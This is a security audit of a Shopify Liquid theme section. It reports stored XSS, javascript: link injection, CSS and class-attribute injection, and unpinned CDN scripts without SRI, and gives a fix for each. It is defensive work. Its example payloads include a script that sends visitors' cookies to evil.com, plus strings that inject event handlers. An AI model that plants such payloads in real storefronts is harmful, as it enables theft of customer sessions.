# Security Audit: ultimate-component.liquid

**Date:** 2026-04-06
**Scope:** `ultimate-component.liquid` — Shopify Liquid section template

## Context

All settings in this component are configured by store admins via the Shopify theme customizer. This limits the input attack surface to: (a) compromised admin accounts, (b) malicious insiders, or (c) supply-chain attacks on external CDN dependencies. Despite the admin-only input vector, the findings below represent real, exploitable vulnerabilities that could affect all storefront visitors.

---

## CRITICAL: Stored XSS via Raw HTML Fields

**Lines 140, 195, 250**

Three `type: "html"` schema fields are rendered without any escaping:

```liquid
{{ block.settings.subtitle_html }}   <!-- line 140 -->
{{ block.settings.maintitle_html }}  <!-- line 195 -->
{{ block.settings.desc_html }}       <!-- line 250 -->
```

These fields accept arbitrary HTML/JavaScript. A compromised admin account can inject persistent XSS payloads (e.g. `<script>document.location='https://evil.com/?c='+document.cookie</script>`) that execute for every visitor to the storefront. This could be used to steal customer sessions, payment info, or redirect to phishing pages.

**Recommendation:** If raw HTML is required, document the risk prominently. Otherwise, switch these to `type: "richtext"` (which Shopify sanitizes) or apply `| strip_html` / `| escape`.

---

## HIGH: Link Injection / javascript: URI XSS

**Line 13**

```liquid
<a href="{{ block.settings.link }}" class="ultimate-component-hyperlink same-height">
```

`block.settings.link` is output unescaped into an `href`. Manually entered values like `javascript:alert(document.cookie)` would execute on click. This is a stored XSS vector.

**Recommendation:** Validate the URL scheme or use `| escape` on the href value.

---

## HIGH: CSS Injection via Unescaped Style Attributes

Multiple settings are interpolated directly into `style=""` attributes without escaping, allowing CSS injection and potential attribute breakout:

| Line(s) | Setting | Context |
|---------|---------|---------|
| 44 | `block.settings.background_overlay` | `background:{{ ... }}` |
| 77-80 | `block.settings.padding_top/left/bottom/right` | `padding-*:{{ ... }}` |
| 84 | `block.settings.max_width` | `width:{{ ... }}` |
| 113, 140 | `block.settings.subtitlecolor` | `color:{{ ... }}` |
| 168, 195 | `block.settings.maintitlecolor` | `color:{{ ... }}` |
| 223, 250 | `block.settings.desccolor` | `color:{{ ... }}` |
| 296-297 | `section.settings.height`, `section.settings.mobile_height` | CSS custom properties |
| 416-418 | `section.settings.z_index`, `top_edge_margin`, `bottom_edge_margin` | Various CSS properties |

A malicious value like `red" onclick="alert(1)" data-x="` could break out of the `style` attribute into an event handler. CSS injection alone can exfiltrate data via `url()` or deface the page.

**Recommendation:** Apply `| escape` to all values used in HTML attributes, including inside `style=""`.

---

## HIGH: HTML Attribute Injection via Unescaped Class Names

**Lines 2, 92, 119, 147, 174, 202, 229**

```liquid
{{ section.settings.class_name | defaut: ""}}    <!-- line 2, note: typo "defaut" -->
{{ block.settings.subtitle_css_classes }}          <!-- line 92 -->
{{ block.settings.maintitle_css_classes }}         <!-- line 147 -->
{{ block.settings.desc_css_classes }}              <!-- line 202 -->
```

These `type: "text"` fields are injected directly into `class=""` attributes. A value containing `" onmouseover="alert(1)` breaks out of the class attribute and injects an event handler — a stored XSS vector.

**Recommendation:** Apply `| escape` to all values interpolated into HTML attributes.

---

## HIGH: External CDN Dependencies Without Subresource Integrity (SRI)

**Lines 1, 676, 691**

```html
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
```
```javascript
tag.src = 'https://cdn.jsdelivr.net/npm/lax.js';                           // line 676
tag.src = 'https://cdn.jsdelivr.net/npm/yall-js@3.2.0/dist/yall.min.js';   // line 691
```

Three external resources are loaded without SRI hashes and without pinned versions (`lax.js` has no version at all). If the CDN is compromised, or a maintainer publishes a malicious update, arbitrary JavaScript executes on every store using this component. This is a supply-chain attack vector independent of admin access.

**Recommendation:**
- Add `integrity="sha384-..."` and `crossorigin="anonymous"` attributes to all external resources
- Pin all dependencies to specific versions (especially `lax.js` which currently resolves to `latest`)
- Consider self-hosting these assets via Shopify's asset pipeline

---

## Summary

| Severity | Finding | Lines |
|----------|---------|-------|
| **CRITICAL** | Stored XSS via raw HTML fields (`subtitle_html`, `maintitle_html`, `desc_html`) | 140, 195, 250 |
| **HIGH** | Link injection / `javascript:` URI XSS | 13 |
| **HIGH** | CSS injection via unescaped style attribute values | 44, 77-80, 84, 113, 168, 223, 296-297, 416-418 |
| **HIGH** | HTML attribute injection via unescaped class names | 2, 92, 147, 202 |
| **HIGH** | External CDN without SRI (supply-chain risk) | 1, 676, 691 |
